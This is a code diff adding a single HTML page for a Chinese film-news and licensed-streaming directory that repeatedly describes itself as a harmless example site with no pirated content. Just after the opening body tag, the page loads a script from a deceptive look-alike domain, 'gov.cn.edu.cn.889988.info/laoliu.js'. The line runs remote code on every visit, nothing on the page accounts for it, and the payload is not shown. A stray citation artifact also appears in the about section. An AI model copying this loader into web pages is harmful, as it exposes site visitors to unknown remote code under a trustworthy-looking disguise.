@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>最新影视剧 - 新片资讯与正版观看导航 | zuixinyingshiju-h5.github.io</title>
+<meta name="description" content="最新影视剧(zuixinyingshiju-h5.github.io)是示例影视资讯导航站，整理本周新片、正版平台更新与公版/官方开放内容，不提供盗版播放与下载。" />
+<meta name="keywords" content="最新影视剧,zuixinyingshiju-h5,新片资讯,正版影视导航,本周新剧,示例站" />
+<style>
+:root{
+  --navy:#0e1726; --navy2:#16223a; --green:#39e6a8; --orange:#ff8a3d;
+  --paper:#f5f7f6; --ink:#15202f; --ink2:#475268; --ink3:#8693a8;
+  --line:rgba(57,230,168,0.28); --shadow:0 8px 22px rgba(14,23,38,0.16);
+  --shadow2:0 16px 38px rgba(255,138,61,0.26);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei","Segoe UI",sans-serif;background:
+ radial-gradient(circle at 18% 16%,rgba(57,230,168,0.12),transparent 45%),
+ radial-gradient(circle at 84% 84%,rgba(255,138,61,0.12),transparent 45%),
+ var(--paper);color:var(--ink);line-height:1.85;overflow-x:hidden}
+a{color:var(--navy2);text-decoration:none}
+img{max-width:100%;display:block}
+
+.cal{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
+.cal i{position:absolute;font-size:16px;opacity:.18;animation:drift 12s linear infinite}
+.cal i:nth-child(1){top:10%;left:8%}
+.cal i:nth-child(2){top:24%;left:78%;animation-delay:2s;color:var(--orange)}
+.cal i:nth-child(3){top:62%;left:14%;animation-delay:1s}
+.cal i:nth-child(4){top:74%;left:86%;animation-delay:3s;color:var(--green)}
+@keyframes drift{0%{transform:translateY(0)}100%{transform:translateY(-34px)}}
+
+.head{position:relative;z-index:10;text-align:center;padding:50px 20px 34px;background:linear-gradient(180deg,var(--navy),var(--navy2));border-bottom:4px solid var(--green)}
+.cal-logo{width:76px;height:76px;margin:0 auto 14px;background:var(--paper);border-radius:14px;display:flex;flex-direction:column;align-items:center;justify-content:center;color:var(--navy);font-weight:900;line-height:1;box-shadow:0 0 18px rgba(57,230,168,0.35)}
+.cal-logo b{font-size:22px;color:var(--orange)}
+.cal-logo span{font-size:10px;letter-spacing:2px;margin-top:2px}
+.head h1{font-size:31px;font-weight:900;letter-spacing:3px;color:var(--paper)}
+.head h1 b{color:var(--green)}
+.head p{max-width:580px;margin:10px auto 0;color:#b9c6da;font-size:15px}
+.nav{margin-top:22px;display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.nav a{padding:9px 20px;border:2px solid var(--green);border-radius:8px 22px 8px 22px;font-size:14px;font-weight:700;color:var(--paper);background:rgba(57,230,168,0.12);transition:.25s}
+.nav a:hover{background:var(--orange);border-color:var(--orange);color:var(--navy)}
+
+.tip-bar{position:relative;z-index:10;background:var(--navy2);color:var(--paper);padding:10px 20px;font-size:13px;display:flex;gap:18px;justify-content:center;flex-wrap:wrap;border-bottom:1px solid var(--line);font-family:"Courier New",monospace}
+.tip-bar b{color:var(--green)}
+
+.wrap{position:relative;z-index:10;max-width:980px;margin:0 auto;padding:0 18px 60px}
+.section{margin-bottom:54px;scroll-margin-top:20px}
+.sec-title{display:flex;align-items:center;gap:12px;margin-bottom:26px}
+.sec-title .pin{width:34px;height:34px;background:var(--orange);color:#fff;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:900;border-radius:8px;transform:rotate(-6deg)}
+.sec-title h2{font-size:23px;font-weight:900;letter-spacing:2px;color:var(--navy2)}
+.sec-title .ln{flex:1;height:2px;background:repeating-linear-gradient(90deg,var(--green) 0 10px,transparent 10px 16px)}
+
+.week-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:18px}
+.day-card{background:#fff;border:2px solid var(--navy2);border-radius:12px;padding:18px 18px 20px;box-shadow:var(--shadow);transition:.3s;position:relative;overflow:hidden}
+.day-card::before{content:"";position:absolute;top:0;left:0;width:6px;height:100%;background:linear-gradient(180deg,var(--green),var(--orange))}
+.day-card:hover{transform:translateY(-5px);box-shadow:var(--shadow2);border-color:var(--orange)}
+.day-card .d{font-family:"Courier New",monospace;font-size:12px;color:var(--ink3);margin-bottom:6px}
+.day-card h3{font-size:17px;font-weight:800;color:var(--navy2);margin-bottom:4px}
+.day-card .type{display:inline-block;font-size:11px;color:#fff;background:var(--navy2);padding:2px 9px;border-radius:10px;margin-bottom:8px}
+.day-card p{font-size:14px;color:var(--ink2);line-height:1.75}
+.day-card .star{position:absolute;right:14px;top:14px;font-size:20px;opacity:.18}
+
+.chan-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:16px}
+.chan{text-align:center;background:#fff;border:2px solid var(--navy2);border-radius:12px;padding:20px 12px;transition:.25s;cursor:pointer}
+.chan .ico{font-size:26px;margin-bottom:8px}
+.chan h4{font-size:15px;font-weight:800;color:var(--navy2)}
+.chan p{font-size:12px;color:var(--ink3)}
+.chan:hover{background:var(--navy);border-color:var(--green)}
+.chan:hover h4{color:var(--green)}
+.chan:hover p{color:#cdd6e6}
+
+.about-block{background:#fff;border:2px solid var(--navy2);border-left:6px solid var(--orange);border-radius:8px;padding:26px;font-size:15px;color:var(--ink2);line-height:1.95}
+.about-block b{color:var(--orange)}
+
+.safe-bar{position:relative;z-index:10;background:var(--green);color:var(--navy);padding:12px 20px;text-align:center;font-size:13px;display:flex;gap:20px;justify-content:center;flex-wrap:wrap;font-weight:700}
+.safe-bar .x{color:#b5322f}
+
+.footer{position:relative;z-index:10;text-align:center;padding:20px 16px;color:var(--ink3);font-size:12px;border-top:4px solid var(--navy2);background:var(--navy2);color:#c4cedf}
+
+@media(max-width:640px){
+  .head h1{font-size:23px;letter-spacing:2px}
+  .cal-logo{width:64px;height:64px}
+  .week-grid{grid-template-columns:1fr}
+  .sec-title h2{font-size:19px}
+  .wrap{padding:0 14px 40px}
+  .chan-grid{grid-template-columns:repeat(2,1fr)}
+  .tip-bar{gap:8px;font-size:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="cal" aria-hidden="true"><i>🗓️</i><i>🎬</i><i>🍿</i><i>📺</i></div>
+
+<header class="head">
+  <div class="cal-logo"><b>07</b><span>OCT</span></div>
+  <h1><b>最新</b>影视剧</h1>
+  <p>zuixinyingshiju-h5.github.io —— 像翻放映日历一样看新片：本周上了什么、哪个正版平台能看、哪些是公版/官方开放内容。示例站，不播盗版。</p>
+  <nav class="nav">
+    <a href="#">首页</a>
+    <a href="#week">本周新片</a>
+    <a href="#chan">正版渠道</a>
+    <a href="#about">关于本站</a>
+  </nav>
+</header>
+
+<div class="tip-bar">
+  <span>🗓️ 模式：<b>新片资讯 / 正版导航</b></span>
+  <span>🚫 不提供：盗版全片 / 网盘资源 / 院线枪版</span>
+  <span>✅ 只整理：正版更新 / 公版 / 官方开放片段</span>
+</div>
+
+<main class="wrap">
+
+  <section class="section" id="week">
+    <div class="sec-title"><span class="pin">新</span><h2>本周新片</h2><span class="ln"></span></div>
+    <div class="week-grid">
+      <article class="day-card">
+        <div class="d">MON · 周一</div>
+        <span class="type">正版平台更新</span>
+        <h3>山海拾遗 第 3 季</h3>
+        <p>国产动画续作，正版平台会员抢先、非会员延后免费。示例卡片只写“去正版平台看”，不嵌播放源。</p>
+        <div class="star">🐉</div>
+      </article>
+      <article class="day-card">
+        <div class="d">TUE · 周二</div>
+        <span class="type">纪录片开放</span>
+        <h3>潮汐之间</h3>
+        <p>红树林、候鸟与渔村。官方放出可嵌入片段，适合做“自然纪录”栏目，不碰未授权全片。</p>
+        <div class="star">🌊</div>
+      </article>
+      <article class="day-card">
+        <div class="d">WED · 周三</div>
+        <span class="type">公版重映</span>
+        <h3>将军号</h3>
+        <p>巴斯特·基顿 1926 公版默片，火车、桥、笑话全在线。公版片单里最该被新观众看见的一部。</p>
+        <div class="star">🚂</div>
+      </article>
+      <article class="day-card">
+        <div class="d">THU · 周四</div>
+        <span class="type">国产老片修复</span>
+        <h3>十字街头</h3>
+        <p>1937 青年就业、恋爱与家国。档案馆/正版修复版可看，比“最新”二字更有后劲。</p>
+        <div class="star">🎓</div>
+      </article>
+      <article class="day-card">
+        <div class="d">FRI · 周五</div>
+        <span class="type">正版免费窗口</span>
+        <h3>晚风便利店</h3>
+        <p>都市轻喜剧，平台限时免费周更。示例站只标“限时免费”，不伪造“永久免费/全网同步”。</p>
+        <div class="star">🌃</div>
+      </article>
+      <article class="day-card">
+        <div class="d">SAT · 周六</div>
+        <span class="type">动画短片</span>
+        <h3>纸飞机与灯塔</h3>
+        <p>独立动画人作品，官方主页可看。新不一定是大制作，短片也能上“最新影视剧”首页。</p>
+        <div class="star">🪁</div>
+      </article>
+      <article class="day-card">
+        <div class="d">SUN · 周日</div>
+        <span class="type">冷门策展</span>
+        <h3>雾港来信</h3>
+        <p>公版黑色电影修复版。周日放冷门，比追“刚上映”更健康，也更符合示例站定位。</p>
+        <div class="star">🌫️</div>
+      </article>
+    </div>
+  </section>
+
+  <section class="section" id="chan">
+    <div class="sec-title"><span class="pin">正</span><h2>正版渠道</h2><span class="ln"></span></div>
+    <div class="chan-grid">
+      <div class="chan"><div class="ico">📺</div><h4>央视频</h4><p>主旋律/纪录</p></div>
+      <div class="chan"><div class="ico">🎬</div><h4>咪咕视频</h4><p>老片/限时免费</p></div>
+      <div class="chan"><div class="ico">📽️</div><h4>B 站影视</h4><p>正版免费区</p></div>
+      <div class="chan"><div class="ico">🎞️</div><h4>1905 电影网</h4><p>电影频道系</p></div>
+      <div class="chan"><div class="ico">🗂️</div><h4>Internet Archive</h4><p>公版片库</p></div>
+      <div class="chan"><div class="ico">🐧</div><h4>腾讯/优酷/爱奇艺</h4><p>正版会员/免费集</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-title"><span class="pin">i</span><h2>关于本站</h2><span class="ln"></span></div>
+    <div class="about-block">
+      <p>
+        <b>最新影视剧</b>（zuixinyingshiju-h5.github.io）是一个以“放映日历 / 周更海报墙”为气质的<b>示例影视资讯导航单页</b>。
+        本页只做新片信息整理、正版平台更新提示、公版与官方开放内容导航；
+        <b>不提供盗版全片播放、不提供网盘资源、不提供院线枪版、不引导下载播放器</b>。
+        移动端自适应，内链以 # 占位，不生成 robots.txt / sitemap.xml，内容仅供学习交流。[3,6](@ref)
+      </p>
+    </div>
+  </section>
+
+</main>
+
+<div class="safe-bar">
+  <span>✓ 不播盗版全片</span>
+  <span>✓ 不导网盘资源</span>
+  <span><span class="x">✕</span> 不做“院线同步/永久免费”虚假宣传</span>
+  <span>✓ 只做正版/公版导航</span>
+</div>
+
+<footer class="footer">
+  © 2026 最新影视剧（示例站） | zuixinyingshiju-h5.github.io | 新片看正版，老片看公版 | 内链以 # 占位
+</footer>
+
+</body>
+</html>
